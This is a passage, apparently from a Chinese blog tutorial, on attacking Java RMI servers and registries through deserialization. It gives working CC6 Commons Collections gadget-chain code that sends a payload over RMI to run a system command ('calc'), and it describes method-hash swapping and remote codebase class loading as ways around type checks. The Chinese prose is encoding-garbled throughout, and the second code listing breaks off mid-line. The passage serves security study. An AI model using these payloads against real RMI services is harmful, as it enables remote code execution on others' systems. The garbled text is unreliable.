æ‰¾åˆ°è¿™ä¸ªäººï¼ˆRemote Objectï¼‰ã€‚</p><p>å‚ä¸ä¸€æ¬¡ RMI è°ƒç”¨çš„æœ‰ä¸‰ä¸ªè§’è‰²ï¼Œåˆ†åˆ«æ˜¯ Server ç«¯ï¼ŒRegistry ç«¯å’Œ Client ç«¯ã€‚ä¸¥æ ¼æ„ä¹‰ä¸Šæ¥è®²ï¼Œåªæœ‰ Registry ç«¯å’Œä½¿ç”¨ Registry çš„ç«¯ï¼Œå› ä¸º Registry ç«¯åªè´Ÿè´£æŸ¥è¯¢å’Œä¼ é€’å¼•ç”¨ï¼ŒçœŸæ­£çš„æ–¹æ³•è°ƒç”¨æ˜¯ä¸éœ€è¦ç»è¿‡ Registry ç«¯çš„ï¼Œåªä¸è¿‡æ³¨å†ŒæœåŠ¡çš„æˆ‘ä»¬ç§°ä¹‹ä¸º Server ç«¯ï¼Œä½¿ç”¨æœåŠ¡çš„æˆ‘ä»¬ç§°ä¹‹ä¸º Client ç«¯ã€‚</p><p><strong>æœ‰ä¸€ç§æˆ‘åªè´Ÿè´£å¸®ä½ æ‰¾åˆ°äººï¼Œè‡³äºä½ æ‰¾è¿™ä¸ªäººåšä»€ä¹ˆéæ³•å‹¾å½“æˆ‘ä¸ç®¡çš„æ„Ÿè§‰</strong>ï¼Œä¸è¿‡ä¸ºäº†æ›´æ¸…æ™°çš„åˆ’åˆ†ä¸åŒè§’è‰²ï¼Œæˆ‘ä»¬è¿˜æ˜¯å°†å…¶åˆ†ä¸ºä¸‰ä¸ªè§’è‰²ï¼Œè€Œé€šå¸¸æƒ…å†µä¸‹ï¼ŒServer ç«¯å’Œ Registry ç«¯æ˜¯åŒä¸€ç«¯ã€‚</p><p>RMIè°ƒç”¨è¿‡ç¨‹å†³å®šäº†ä¸‰è€…éƒ½æ¶‰åŠååºåˆ—åŒ–æ“ä½œï¼Œæ‰€ä»¥å¯¹è¿™ä¸‰è€…çš„æ”»å‡»å°±å‘¼ä¹‹æ¬²å‡ºã€‚</p><p>å¤§æ¦‚åˆ†è¿™å‡ ç§ï¼š</p><ol><li>æ”»å‡»å®¢æˆ·ç«¯<ul><li>RegistryImp_Stub#lookup ååºåˆ—åŒ–æ³¨å†Œä¸­å¿ƒè¿”å›çš„Stub</li><li>UnicastRef#invoke ååºåˆ—åŒ–è¿œè°ƒæ–¹æ³•çš„æ‰§è¡Œç»“æœ</li><li>StreamRemoteCall#executeCall ååºåˆ—åŒ–è¿œç¨‹è°ƒç”¨è¿”å›çš„å¼‚å¸¸ç±»</li><li>DGCImpl_Stub#dirty</li></ul></li><li>æ”»å‡»æœåŠ¡ç«¯<ul><li>UnicastServerRef#dispatch ååºåˆ—åŒ–å®¢æˆ·ç«¯ä¼ é€’çš„æ–¹æ³•å‚æ•°</li><li>DGCImpl_Skel#dispatch</li></ul></li><li>æ”»å‡»æ³¨å†Œä¸­å¿ƒ<ul><li>RegistryImp_Stub#bind æ³¨å†Œä¸­å¿ƒååºåˆ—åŒ–æœåŠ¡ç«¯ä¼ é€’ä¼ æ¥çš„è¿œç¨‹å¯¹è±¡</li></ul></li></ol><h3 id="Server-ç«¯-Attack"><a href="#Server-ç«¯-Attack" class="headerlink" title="Server ç«¯ Attack"></a>Server ç«¯ Attack</h3><h4 id="æ¶æ„æœåŠ¡å‚æ•°"><a href="#æ¶æ„æœåŠ¡å‚æ•°" class="headerlink" title="æ¶æ„æœåŠ¡å‚æ•°"></a>æ¶æ„æœåŠ¡å‚æ•°</h4><p>è¿™é‡Œéœ€è¦ä¸€ä¸ªèƒŒæ™¯ï¼Œå½“ Client ç«¯è·å–åˆ° Server ç«¯åˆ›å»ºçš„ Stub åï¼ŒClient ä¼šåœ¨æœ¬åœ°è°ƒç”¨è¿™ä¸ª Stub å¹¶ä¼ é€’å‚æ•°ï¼ŒStub ä¼šåºåˆ—åŒ–è¿™ä¸ªå‚æ•°å¹¶ä¼ é€’ç»™ Server ç«¯ï¼Œ<strong>Server ç«¯å°±ä¼šååºåˆ—åŒ– Client ç«¯ä¼ å…¥çš„å‚æ•°å¹¶è¿›è¡Œè°ƒç”¨</strong>ï¼Œå¦‚æœè¿™ä¸ªå‚æ•°æ˜¯ <strong>Object ç±»å‹</strong>çš„æƒ…å†µä¸‹ï¼ŒClient ç«¯å¯ä»¥ä¼ ç»™ Server ç«¯<strong>ä»»æ„çš„ç±»</strong>ï¼Œç›´æ¥é€ æˆååºåˆ—åŒ–æ¼æ´ã€‚</p><p>ä¾‹å¦‚æˆ‘ä»¬ä¸Šé¢å†™çš„åœ¨è¿œç¨‹è°ƒç”¨æ¥å£ RemoteInterface å­˜åœ¨ä¸€ä¸ªä¼ å…¥Objectç±»å‹çš„<code>sayGoodbye</code>æ–¹æ³•ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.rmi.Remote;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Hello</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Remote</span> &#123;<br>    String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(Object name)</span> <span class="hljs-keyword">throws</span> RemoteException;<br>&#125;<br></code></pre></td></tr></table></figure><p>é‚£å°±ç›´æ¥å¯ä»¥ä¼ ä¸€ä¸ªååºåˆ—åŒ– payload è¿›å»æ‰§è¡Œï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">import</span> java.rmi.Remote;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIClient</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> LocateRegistry.getRegistry(<span class="hljs-string">&quot;127.0.0.1&quot;</span>, <span class="hljs-number">9999</span>);<br>        <span class="hljs-type">Hello</span> <span class="hljs-variable">stub</span> <span class="hljs-operator">=</span> (Hello) r.lookup(<span class="hljs-string">&quot;hello&quot;</span>);<br>        stub.sayHello(getPayload());<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getPayload</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                        <span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                        <span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;Runtime.class, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                        <span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        Transformer[] fakeTransformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<span class="hljs-keyword">new</span><br>                <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>)&#125;;<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(fakeTransformers);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map, transformerChain);<br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;test&quot;</span>);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">expMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        expMap.put(tiedMapEntry, <span class="hljs-string">&quot;xxx&quot;</span>);<br><br>        lazyMap.remove(<span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);<br>        f.setAccessible(<span class="hljs-literal">true</span>);<br>        f.set(transformerChain, transformers);<br><br>        <span class="hljs-keyword">return</span> expMap;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Hello</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Remote</span> &#123;<br>        String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(Object name)</span> <span class="hljs-keyword">throws</span> RemoteException;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>CC6ç›´æ¥å¼¹calcã€‚</p><p>å¦‚æœå‚æ•°ç±»å‹ä¸æ˜¯ Object ç±»å‹ï¼Œé‚£èƒ½å¦è¿›è¡Œæ”»å‡»ï¼Ÿ</p><p>å½“ç„¶å¯ä»¥ã€‚</p><p>è¿™é‡Œå¯ä»¥çœ‹ä¸€ä¸ªå°å®éªŒï¼Œæˆ‘ä»¬åœ¨Serverçš„æ¥å£å¤„è‹¥ä½¿ç”¨<code>HelloObject</code>ä½œä¸ºå‡½æ•°å‚æ•°ï¼ŒClientçš„æ¥å£ä½¿ç”¨<code>Object</code>ä½œä¸ºå‡½æ•°å‚æ•°ï¼š</p><p>Serverï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">RemoteInterface</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Remote</span> &#123;<br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException;<br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(HelloObject name)</span> <span class="hljs-keyword">throws</span> RemoteException;<br>&#125;<br></code></pre></td></tr></table></figure><p>Client:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">RemoteInterface</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Remote</span> &#123;<br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException;<br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(Object name)</span> <span class="hljs-keyword">throws</span> RemoteException;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™æ ·è‹¥æƒ³ç›´æ¥è§¦å‘ååºåˆ—åŒ–æ´ä¼šæŠ¥é”™ï¼š</p><p><img src="/2024/07/18/RMI-JNDI/4.png" alt="4"></p><p>å…¶å®å¯ä»¥çœ‹å‡ºï¼Œå°±æ˜¯åœ¨æœåŠ¡ç«¯æ²¡æœ‰æ‰¾åˆ°å¯¹åº”çš„è°ƒç”¨æ–¹æ³•ã€‚å¯ä»¥å‘ç°è¿™ä¸ªè°ƒç”¨æ–¹æ³•åœ¨ UnicastServerRef çš„ <code>dispatch</code> æ–¹æ³•ä¸­åœ¨ <code>this.hashToMethod_Map</code> ä¸­é€šè¿‡ Method çš„ hash æ¥æŸ¥æ‰¾ã€‚</p><p>è¿™ä¸ª hash å®é™…ä¸Šæ˜¯ä¸€ä¸ªåŸºäºæ–¹æ³•ç­¾åçš„ SHA1 hash å€¼ã€‚</p><p>é‚£æœ‰æ²¡æœ‰ä¸€ç§å¯èƒ½ï¼Œ<strong>æˆ‘ä»¬ä¼ é€’çš„æ˜¯ Server ç«¯èƒ½æ‰¾åˆ°çš„å‚æ•°æ˜¯ HelloObject çš„ Method çš„ hashï¼Œä½†æ˜¯ä¼ é€’çš„å‚æ•°å´ä¸æ˜¯ HelloObject è€Œæ˜¯æ¶æ„çš„ååºåˆ—åŒ–æ•°æ®ï¼ˆå¯èƒ½æ˜¯ Objectæˆ–å…¶ä»–çš„ç±»ï¼‰å‘¢ï¼Ÿ</strong></p><p>ç­”æ¡ˆæ˜¯å¯ä»¥çš„ï¼Œåœ¨ mogwailabs çš„ [PPT](<a href="https://github.com/mogwailabs/rmi-deserialization/blob/master/BSides">https://github.com/mogwailabs/rmi-deserialization/blob/master/BSides</a> Exploiting RMI Services.pdf) ä¸­æå‡ºäº†ä»¥ä¸‹ 4 ç§æ–¹æ³•ï¼š</p><ul><li>é€šè¿‡ç½‘ç»œä»£ç†ï¼Œåœ¨æµé‡å±‚ä¿®æ”¹æ•°æ®</li><li>è‡ªå®šä¹‰ â€œjava.rmiâ€ åŒ…çš„ä»£ç ï¼Œè‡ªè¡Œå®ç°</li><li>å­—èŠ‚ç ä¿®æ”¹</li><li>ä½¿ç”¨ debugger</li></ul><p>å¹¶ä¸”åœ¨ PPT ä¸­è¿˜ç»™å‡ºäº† hook ç‚¹ï¼Œé‚£å°±æ˜¯åŠ¨æ€ä»£ç†ä¸­ä½¿ç”¨çš„ RemoteObjectInvocationHandler çš„ <code>invokeRemoteMethod</code> æ–¹æ³•ã€‚</p><p>å®¢æˆ·ç«¯çš„æ¥å£ä¹Ÿæ·»åŠ ä¸€ä¸ªåŒæœåŠ¡ç«¯ç›¸åŒçš„æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Hello</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Remote</span> &#123;<br>    String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(Object s)</span> <span class="hljs-keyword">throws</span> RemoteException;<br>    String <span class="hljs-title function_">sayGoodBye</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> RemoteException;<br>    String <span class="hljs-title function_">sayGoodBye</span><span class="hljs-params">(HelloObject o)</span> <span class="hljs-keyword">throws</span> RemoteException;  <span class="hljs-comment">//Same as Server&#x27;s</span><br>&#125;<br></code></pre></td></tr></table></figure><p>å³è°ƒè¯•ä¸‹æ–­ç‚¹çš„æ—¶å€™ï¼Œåœ¨<code>RemoteObjectInvocationHandler</code>è°ƒç”¨<code>invokeRemoteMethod</code>çš„æ—¶å€™ä¿®æ”¹methodï¼ˆåœ¨ RemoteObjectInvocationHandler çš„ <code>invokeRemoteMethod</code> æ–¹æ³•å¤„ä¸‹æ–­ï¼Œå°† Method æ”¹ä¸ºæœåŠ¡ç«¯å­˜åœ¨çš„ HelloObject çš„ Methodï¼‰ï¼Œä¸‹é¢<code>getMethodHash(method)</code>è·å–åˆ°çš„å“ˆå¸Œå°±å’ŒæœåŠ¡ç«¯çš„ä¸€æ ·äº†ï¼Œåç»­å¼¹calcéƒ½ä¸€æ ·çš„ã€‚</p><p><img src="/2024/07/18/RMI-JNDI/5.png" alt="5"></p><p>Afant1 å¸ˆå‚…ä½¿ç”¨äº† Java Agent çš„æ–¹å¼æ’æ¡©ï¼Œåœ¨<a href="https://www.anquanke.com/post/id/200860">è¿™ç¯‡æ–‡ç« </a>é‡Œï¼Œ0c0c0f å¸ˆå‚…ä½¿ç”¨äº†æµé‡å±‚çš„æ›¿æ¢ï¼Œåœ¨<a href="https://mp.weixin.qq.com/s/TbaRFaAQlT25ASmdTK_UOg">è¿™ç¯‡æ–‡ç« </a>é‡Œï¼Œæœ‰å…´è¶£çš„å¸ˆå‚…è¯·è‡ªè¡ŒæŸ¥çœ‹ã€‚</p><p>åˆ©ç”¨è¿™ç§æ–¹å¼ï¼Œå°±å¤§å¤§çš„æ‰©å±•äº†åˆ©ç”¨é“¾ã€‚RMI çš„ååºåˆ—åŒ–é€»è¾‘ä½äº <code>sun.rmi.server.UnicastRef#unmarshalValue</code>ï¼Œå¦‚ä¸‹ï¼š</p><p><img src="/2024/07/18/RMI-JNDI/6.png" alt="6"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œé™¤äº†åŸºç¡€æ•°æ®ç±»å‹ï¼Œå…¶ä»–çš„ç±»å‹å‡èƒ½è°ƒç”¨ readObject è¿›è¡Œååºåˆ—åŒ–ï¼Œç”šè‡³åŸæœ¬ String ç±»å‹çš„å‚æ•°ä¹Ÿä¼šèµ° readObject ååºåˆ—åŒ–ï¼Œé‚£ä¹ˆç»“åˆä¹‹å‰çš„æ›¿æ¢æ‰‹æ®µï¼Œæ€»ç»“èµ·æ¥å°±æ˜¯ï¼š</p><blockquote><p><strong>Server ç«¯çš„è°ƒç”¨æ–¹æ³•å­˜åœ¨éåŸºç¡€ç±»å‹çš„å‚æ•°æ—¶ï¼Œå°±å¯ä»¥è¢«æ¶æ„ Client ç«¯ä¼ å…¥æ¶æ„æ•°æ®æµè§¦å‘ååºåˆ—åŒ–æ¼æ´ã€‚</strong></p></blockquote><h4 id="åŠ¨æ€ç±»åŠ è½½"><a href="#åŠ¨æ€ç±»åŠ è½½" class="headerlink" title="åŠ¨æ€ç±»åŠ è½½"></a>åŠ¨æ€ç±»åŠ è½½</h4><p>ä¸Šé¢è¯´è¿‡ï¼ŒRMIååºåˆ—åŒ–å‚æ•°çš„æ—¶å€™ï¼Œè‹¥åœ¨æœ¬åœ°æ‰¾ä¸åˆ°ç±»ï¼Œä¼šåœ¨æŒ‡å®šçš„codebaseä¸‹åŠ è½½ç±»ï¼Œè€Œcodebaseå¯ä»¥ç”±å®¢æˆ·ç«¯æŒ‡å®šï¼Œé‚£ä¹ˆè¿™å°±æ˜¯ä¸€ä¸ªå¾ˆæœ‰ç”¨çš„æ‰“ååºåˆ—åŒ–çš„åœ°æ–¹ã€‚è¿™ä¸ªç‰¹æ€§åœ¨ 6u45&#x2F;7u21 ä¹‹å‰éƒ½æ˜¯é»˜è®¤å¼€å¯çš„ã€‚</p><p>ä¸ºäº†èƒ½å¤Ÿè¿œç¨‹åŠ è½½ç›®æ ‡ç±»ï¼Œéœ€è¦ Server åŠ è½½å¹¶é…ç½® SecurityManagerï¼Œå¹¶è®¾ç½® <code>java.rmi.server.useCodebaseOnly=false</code>ã€‚</p><p>Server ç«¯è°ƒç”¨ UnicastServerRef çš„ <code>dispatch</code> æ–¹æ³•å¤„ç†å®¢æˆ·ç«¯è¯·æ±‚ï¼Œè°ƒç”¨ <code>unmarshalParameters</code> æ–¹æ³•ååºåˆ—åŒ–å®¢æˆ·ç«¯ä¼ æ¥çš„å‚æ•°ã€‚</p><p>ååºåˆ—åŒ–è¿‡ç¨‹ç”± RMI å°è£…ç±» MarshalInputStream æ¥å®ç°ï¼Œä¼šè°ƒç”¨ <code>resolveClass</code> æ¥è§£æ Classã€‚</p><p>æ— è®º Server ç«¯è¿˜æ˜¯ Client ç«¯ï¼Œåªè¦æœ‰ä¸€ç«¯é…ç½®äº† <code>java.rmi.server.codebase</code>ï¼Œè¿™ä¸ªå±æ€§éƒ½ä¼šè·Ÿéšæ•°æ®æµåœ¨ä¸¤ç«¯æµåŠ¨ã€‚</p><p><strong>å› æ­¤ï¼ŒClient ç«¯å¯ä»¥é€šè¿‡é…ç½®æ­¤é¡¹å±æ€§ï¼Œå¹¶å‘ Server ç«¯ä¼ é€’ä¸å­˜åœ¨çš„ç±»ï¼Œä½¿ Server ç«¯è¯•å›¾ä» <code>java.rmi.server.codebase</code> åœ°å€ä¸­è¿œç¨‹åŠ è½½æ¶æ„ç±»è€Œè§¦å‘æ”»å‡»ã€‚</strong></p><h4 id="æ›¿èº«æ”»å‡»"><a href="#æ›¿èº«æ”»å‡»" class="headerlink" title="æ›¿èº«æ”»å‡»"></a>æ›¿èº«æ”»å‡»</h4><p>åœ¨è®¨è®ºå¯¹ Server ç«¯çš„æ”»å‡»æ—¶ï¼Œè¿˜å‡ºç°äº†å¦å¤–ä¸€ç§é’ˆå¯¹å‚æ•°çš„æ”»å‡»æ€è·¯ï¼Œsu18å¸ˆå‚…ç§°å…¶ä¸ºæ›¿èº«æ”»å‡»ã€‚ä¾æ—§æ˜¯ç”¨æ¥ç»•è¿‡å½“å‚æ•°ä¸æ˜¯ Objectï¼Œæ˜¯æŒ‡å®šç±»å‹ï¼Œä½†æ˜¯è¿˜æƒ³è§¦å‘ååºåˆ—åŒ–çš„ä¸€ç§è®¨è®ºã€‚</p><p>å¤§ä½“çš„æ€è·¯å°±æ˜¯è°ƒç”¨çš„æ–¹æ³•å‚æ•°æ˜¯ <code>HelloObject</code>ï¼Œè€Œæ”»å‡»è€…å¸Œæœ›ä½¿ç”¨ CC é“¾æ¥ååºåˆ—åŒ–ï¼Œæ¯”å¦‚ä½¿ç”¨äº†ä¸€ä¸ªå…¥å£ç‚¹ä¸º HashMap çš„ POCï¼Œé‚£ä¹ˆæ”»å‡»è€…åœ¨æœ¬åœ°çš„ç¯å¢ƒä¸­å°† HashMap é‡å†™ï¼Œè®© HashMap ç»§æ‰¿ HelloObjectï¼Œç„¶åå®ç°ååºåˆ—åŒ–æ¼æ´æ”»å‡»çš„é€»è¾‘ï¼Œç”¨æ¥æ¬ºéª— RMI çš„æ ¡éªŒæœºåˆ¶ã€‚</p><p>è¿™çš„ç¡®æ˜¯ä¸€ç§æ€è·¯ï¼Œä½†æ˜¯è¿˜ä¸å¦‚ hook RMI ä»£ç ä¿®æ”¹é€»è¾‘æ¥å¾—å¿«ï¼Œæ‰€ä»¥è¿™é‡Œä¸è¿›è¡Œæµ‹è¯•ã€‚</p><h3 id="Registry-ç«¯-Attack"><a href="#Registry-ç«¯-Attack" class="headerlink" title="Registry ç«¯ Attack"></a>Registry ç«¯ Attack</h3><p>åœ¨ä½¿ç”¨ Registry æ—¶ï¼Œé¦–å…ˆç”± Server ç«¯å‘ Registry ç«¯ç»‘å®šæœåŠ¡å¯¹è±¡ï¼Œè¿™ä¸ªå¯¹è±¡æ˜¯ä¸€ä¸ª Server ç«¯ç”Ÿæˆçš„åŠ¨æ€ä»£ç†ç±»ï¼ŒRegistry ç«¯ä¼šååºåˆ—åŒ–è¿™ä¸ªç±»å¹¶å­˜åœ¨è‡ªå·±çš„ RegistryImpl çš„ bindings ä¸­ï¼Œä»¥ä¾›åç»­çš„æŸ¥è¯¢ã€‚</p><p>æ‰€ä»¥å¦‚æœæˆ‘ä»¬æ˜¯ä¸€ä¸ªæ¶æ„çš„ Server ç«¯ï¼Œå‘ Registry ç«¯è¾“é€äº†ä¸€ä¸ªæ¶æ„çš„å¯¹è±¡ï¼Œåœ¨å…¶ååºåˆ—åŒ–æ—¶å°±å¯ä»¥è§¦å‘æ¶æ„è°ƒç”¨ã€‚</p><p>è¿™é‡Œä»ç„¶ç”¨ CC6 æµ‹è¯•ï¼Œè€Œå› ä¸º bind çš„å‚æ•°æ˜¯éœ€è¦æ˜¯ Remote ç±»å‹çš„ï¼Œæ‰€ä»¥è¿™é‡Œä½¿ç”¨äº† AnnotationInvocationHandler æ¥ä»£ç†äº† Remote æ¥å£ï¼Œå½¢æˆäº†ååºåˆ—åŒ–æ¼æ´ã€‚</p><p>å½¢å¦‚ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.Remote;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIClient</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span 